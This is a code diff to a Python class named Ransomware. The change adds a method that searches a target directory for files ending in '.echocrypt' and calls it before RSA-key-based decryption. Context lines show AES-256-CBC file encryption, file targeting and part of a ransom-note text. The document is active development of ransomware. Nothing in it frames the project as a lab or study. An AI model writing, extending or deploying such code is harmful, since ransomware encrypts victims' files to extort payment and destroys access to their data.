@@ -259,6 +259,25 @@ class Ransomware:
                     logger.debug(f"Skipped file (extension mismatch): {file_path}")
         logger.info(f"Found a total of {len(found_files)} target files.")
         return found_files
+    
+    def _find_encrypted_files(self) -> list:
+        """Searches for encrypted files with the '.echocrypt' extension in the specified directory."""
+        found_encrypted_files = []
+        logger.info(f"Searching for encrypted files in the target directory '{self.target_directory}'...")
+        
+        if not os.path.isdir(self.target_directory):
+            logger.error(f"Target directory '{self.target_directory}' does not exist or is not a directory.")
+            return []
+
+        for root, _, files in os.walk(self.target_directory):
+            for filename in files:
+                file_path = os.path.join(root, filename)
+                if filename.lower().endswith(ENCRYPTED_FILE_EXTENSION.lower()):
+                    found_encrypted_files.append(file_path)
+                else:
+                    logger.debug(f"Skipped file (extension mismatch): {file_path}")
+        logger.info(f"Found a total of {len(found_encrypted_files)} target files.")
+        return found_encrypted_files
 
     def _aes_encrypt_file(self, file_path: str, aes_key: bytes, iv: bytes) -> bytes:
         """Encrypts the given file using AES-256-CBC mode."""
@@ -552,6 +571,12 @@ We understand this is a difficult situation. Follow these steps precisely to get
         logger.info("--- File decryption process started ---")
 
         try:
+            encrypted_files = self._find_encrypted_files()
+
+            if not encrypted_files:
+                logger.warning(f"No encrypted files with the '.echocrypt' extension found in '{self.target_directory}'. Stopping decryption.")
+                return
+            
             self._load_rsa_private_key()
             if not self.private_key:
                 logger.error("RSA private key for decryption is not loaded. Decryption cannot proceed.")
